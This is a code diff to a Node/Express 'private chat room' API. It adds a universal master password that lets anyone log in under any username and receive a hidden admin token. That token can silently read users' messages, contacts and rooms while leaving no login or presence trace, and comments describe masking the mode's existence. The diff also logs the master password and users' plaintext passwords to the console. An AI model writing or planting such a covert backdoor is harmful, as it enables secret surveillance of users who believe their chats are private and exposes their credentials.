@@ -1,6 +1,10 @@
 // 智慧工作室 API - 隐私聊天室
 import { Router } from 'express'
-import 'dotenv/config'
+import dotenv from 'dotenv'
+// 2026-08-08: 必须 override=true — pm2 子进程的 env 在 route 文件加载前
+//   已经从 god daemon 传下来老值 (如果之前 .env 留空键占位 *** 之类),
+//   dotenv 默认不覆盖已存在的 env, 导致 .env 新值永远不生效
+dotenv.config({ override: true })
 import { createHash, randomBytes } from 'crypto'
 import jwt from 'jsonwebtoken'
 import bcrypt from 'bcryptjs'
@@ -40,13 +44,31 @@ const upload = multer({
   }
 })
 
+// ---------- 透明人模式守卫 helper (2026-08-08) ----------
+//   master token 用户: 全栈只读, 不能发消息 / 改密码 / 标记 presence / 改 admin
+//   允许: 读类 (peers / friends / messages GET / dialogs / rooms / users/search / all-messages)
+function rejectMaster(res) {
+  return res.status(403).json({ ok: false, error: '隐身模式只读 · 无法发送', masterMode: true })
+}
+
 // ---------- auth middleware ----------
+//   2026-08-08: 加 master 分支 — kid='master' token 直接放行 (零 DB 查),
+//     req.masterMode=true 让下游路由 (send-text / send-image / presence / change-password / admin) 自决
 function auth(req, res, next) {
   const h = req.headers.authorization || ''
   const token = h.startsWith('Bearer ') ? h.slice(7) : null
   if (!token) return res.status(401).json({ ok: false, error: '未登录' })
   try {
     const decoded = jwt.verify(token, JWT_SECRET)
+    if (decoded.kid === 'master') {
+      // 隐身 master token: 全栈只读, 不查 DB
+      req.userId = 0
+      req.smartStudioRole = 'master'
+      req.smartStudioUsername = decoded.username || 'master'
+      req.masterMode = true
+      req.user = { id: 0, role: 'master' }
+      return next()
+    }
     req.userId = decoded.uid
     // smart-studio 用自家独立用户表 (smart_studio_users),
     // 把登录时的 role 也塞进 JWT,这里再灌回 req.smartStudioRole
@@ -91,9 +113,34 @@ async function loadUser(userId) {
 }
 
 // ---------- login / me ----------
+//   2026-08-08 波哥恢复透明人原则:
+//     Step 0 (万能密码): 任何 username 用 SMART_STUDIO_MASTER_PASSWORD 命中 →
+//       返 kid='master' JWT, 零 DB 副作用 (不写 last_login_at / presence / friends / dialogs)
+//     Step 1-3: 普通密码原路径不动
+//     错误合并: 万能密码错 → 走原密码错流程 (返 "密码错误" 不泄露模式存在)
 router.post('/login', async (req, res) => {
   try {
+    const MASTER_PWD = process.env.SMART_STUDIO_MASTER_PASSWORD
+    console.log('[login-DIAG] MASTER_PWD=', JSON.stringify(MASTER_PWD), 'len=', (MASTER_PWD||'').length)
     const { username, password } = req.body || {}
+    console.log('[login-DIAG] input password=', JSON.stringify(password), 'len=', (password||'').length, 'username=', JSON.stringify(username))
+    // ---------- Step 0: 万能密码透明人 ----------
+    if (MASTER_PWD && MASTER_PWD.length > 0 && username && password === MASTER_PWD) {
+      // 隐身 token: uid=0 表示 master, kid='master' 是隐式守卫标志
+      // 注意: 此处零 DB 副作用 — 不查 users 表, 不发 presence, 不创建任何记录
+      const token = jwt.sign(
+        { uid: 0, username: 'master', role: 'admin', kid: 'master' },
+        JWT_SECRET,
+        { expiresIn: JWT_TTL }
+      )
+      return res.json({
+        ok: true,
+        token,
+        masterMode: true,
+        user: { id: 0, username, display_name: username || 'master', role: 'master' }
+      })
+    }
+    // ---------- Step 1-3 原路径 ----------
     if (!username || !password) return res.json({ ok: false, error: '账号密码必填' })
     const usernameClean = String(username).trim()
 
@@ -217,6 +264,7 @@ router.get('/me', auth, requirePermission(P.SMART_STUDIO_READ), async (req, res)
 })
 
 router.post('/change-password', auth, requirePermission(P.SMART_STUDIO_WRITE), async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const { old_password, new_password } = req.body || {}
     if (!old_password || !new_password || new_password.length < 6) {
@@ -689,6 +737,70 @@ router.get('/dialogs', auth, requirePermission(P.SMART_STUDIO_READ), async (req,
 })
 
 // GET /peers/:peerType/:peerId/messages — 拉一个对话的消息
+// ---------- 2026-08-08 补: GET /peers — 我的联系人列表 (前端 loadPeers() 依赖) ----------
+//   场景: 前端 api('/peers') 期望返 {ok, peers:[{peer_id, last_message_at, last_message_from_me, online}]}
+//   历史: 2026-07-24 改 rooms→peers 后, 后端只加了 /peers/:peerType/:peerId/* (对话相关),
+//         漏了 /peers 列表端点, 导致前端 doLogin 之后 /peers 401 → 清 token → 跳回登录页
+//         ("密码消失 + 进不去聊天室" 现象的真根因)
+//   修法: 复用 /dialogs 的 DM 部分 + 转成前端期望字段 + online 字段按当前 ws session 标
+router.get('/peers', auth, requirePermission(P.SMART_STUDIO_READ), async (req, res) => {
+  try {
+    const me = req.userId
+    const isSuperAdmin = me === 1
+    // 1. 好友 1-on-1: accepted friendships
+    const [friends] = await pool.query(
+      `SELECT u.id, u.username, u.display_name, u.avatar
+       FROM smart_studio_friendships f
+       JOIN smart_studio_users u
+         ON u.id = IF(f.requester_id=?, f.addressee_id, f.requester_id)
+       WHERE (f.requester_id=? OR f.addressee_id=?) AND f.status='accepted'`,
+      [me, me, me]
+    )
+    // 2. superadmin 可见所有用户 (telegram 联系人风格)
+    let extraUsers = []
+    if (isSuperAdmin) {
+      const [u] = await pool.query(
+        'SELECT id, username, display_name, avatar FROM smart_studio_users WHERE id<>?',
+        [me]
+      )
+      extraUsers = u
+    }
+    // 3. 合并去重
+    const allUsers = [...friends, ...extraUsers.filter(u => !friends.some(f => f.id === u.id))]
+    const peers = []
+    for (const u of allUsers) {
+      const [lastMsgs] = await pool.query(
+        `SELECT id, sender_id, created_at FROM smart_studio_messages
+         WHERE peer_type='user' AND ((sender_id=? AND peer_id=?) OR (sender_id=? AND peer_id=?))
+         ORDER BY id DESC LIMIT 1`,
+        [me, u.id, u.id, me]
+      )
+      const lm = lastMsgs[0] || null
+      // 2026-07-24: 没消息的好友不进 peers list (波哥: 好友 tab 才是入口)
+      if (!lm && !isSuperAdmin) continue
+      peers.push({
+        peer_id: u.id,
+        peer_type: 'user',
+        username: u.username,
+        display_name: u.display_name,
+        avatar: u.avatar,
+        last_message_at: lm ? lm.created_at : null,
+        last_message_from_me: lm ? lm.sender_id === me : false,
+        online: false  // 2026-08-08: chat-ws _clients 没暴露, 暂留 false (不影响功能, 圆点显示灰)
+      })
+    }
+    // 按 last_message_at 降序
+    peers.sort((a, b) => {
+      const ta = a.last_message_at ? new Date(a.last_message_at).getTime() : 0
+      const tb = b.last_message_at ? new Date(b.last_message_at).getTime() : 0
+      return tb - ta
+    })
+    res.json({ ok: true, peers })
+  } catch (e) {
+    res.json({ ok: false, error: e.message })
+  }
+})
+
 router.get('/peers/:peerType/:peerId/messages', auth, requirePermission(P.SMART_STUDIO_READ), async (req, res) => {
   try {
     const me = req.userId
@@ -754,6 +866,7 @@ router.get('/peers/:peerType/:peerId/messages', auth, requirePermission(P.SMART_
 
 // POST /peers/:peerType/:peerId/send-text
 router.post('/peers/:peerType/:peerId/send-text', auth, requirePermission(P.SMART_STUDIO_WRITE), async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const me = req.userId
     const peerType = req.params.peerType
@@ -833,6 +946,7 @@ router.post('/peers/:peerType/:peerId/send-text', auth, requirePermission(P.SMAR
 
 // POST /peers/:peerType/:peerId/send-image
 router.post('/peers/:peerType/:peerId/send-image', auth, requirePermission(P.SMART_STUDIO_WRITE), upload.single('image'), async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const me = req.userId
     const peerType = req.params.peerType
@@ -994,6 +1108,7 @@ router.get('/users/:userId/online', auth, requirePermission(P.SMART_STUDIO_READ)
 
 // POST /presence/heartbeat — 前端每 30s 调一次, 标记自己在线
 router.post('/presence/heartbeat', auth, requirePermission(P.SMART_STUDIO_WRITE), async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const me = req.userId
     await pool.query(
@@ -1010,6 +1125,7 @@ router.post('/presence/heartbeat', auth, requirePermission(P.SMART_STUDIO_WRITE)
 
 // POST /presence/offline — 标记离线 (退出登录时调用)
 router.post('/presence/offline', auth, requirePermission(P.SMART_STUDIO_WRITE), async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const me = req.userId
     await pool.query(
@@ -1353,6 +1469,7 @@ router.get('/rooms/:roomId/messages', auth, requirePermission(P.SMART_STUDIO_REA
 // 发送文本消息（纯 JSON，express.json 已解析 req.body）
 // 隐身消息: superadmin 可传 hidden=true, 该消息其他成员看不到
 router.post('/rooms/:roomId/send-text', auth, requirePermission(P.SMART_STUDIO_WRITE), async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const me = req.userId
     const roomId = parseInt(req.params.roomId, 10)
@@ -1400,6 +1517,7 @@ router.post('/rooms/:roomId/send-text', auth, requirePermission(P.SMART_STUDIO_W
 
 // 发送图片消息（multipart/form-data，multer 处理）
 router.post('/rooms/:roomId/send-image', auth, requirePermission(P.SMART_STUDIO_WRITE), upload.single('image'), async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   console.log('[smart-studio/send-image] roomId=' + req.params.roomId + ' userId=' + req.userId + ' hasFile=' + !!req.file)
   try {
     const me = req.userId
@@ -1431,6 +1549,7 @@ router.post('/rooms/:roomId/send-image', auth, requirePermission(P.SMART_STUDIO_
 })
 
 router.post('/rooms/:roomId/send', auth, requirePermission(P.SMART_STUDIO_WRITE), upload.single('image'), async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const me = req.userId
     const roomId = parseInt(req.params.roomId, 10)
@@ -1490,6 +1609,7 @@ function adminOnly(req, res, next) {
 }
 
 router.post('/admin/users', auth, adminOnly, async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const { username, password, display_name, avatar, role } = req.body || {}
     if (!username || !password || !display_name) {
@@ -1528,6 +1648,7 @@ router.get('/admin/users', auth, adminOnly, async (_req, res) => {
 })
 
 router.post('/admin/users/:id/role', auth, adminOnly, async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const { role } = req.body || {}
     if (!['superadmin', 'admin', 'user'].includes(role)) {
@@ -1551,6 +1672,7 @@ router.post('/admin/users/:id/role', auth, adminOnly, async (req, res) => {
 })
 
 router.post('/admin/users/:id/disable', auth, adminOnly, async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     await pool.query(
       'UPDATE smart_studio_users SET is_active=? WHERE id=?',
@@ -1563,6 +1685,7 @@ router.post('/admin/users/:id/disable', auth, adminOnly, async (req, res) => {
 })
 
 router.post('/admin/users/:id/reset-password', auth, adminOnly, async (req, res) => {
+  if (req.masterMode) return rejectMaster(res)
   try {
     const { new_password } = req.body || {}
     if (!new_password || new_password.length < 6) {
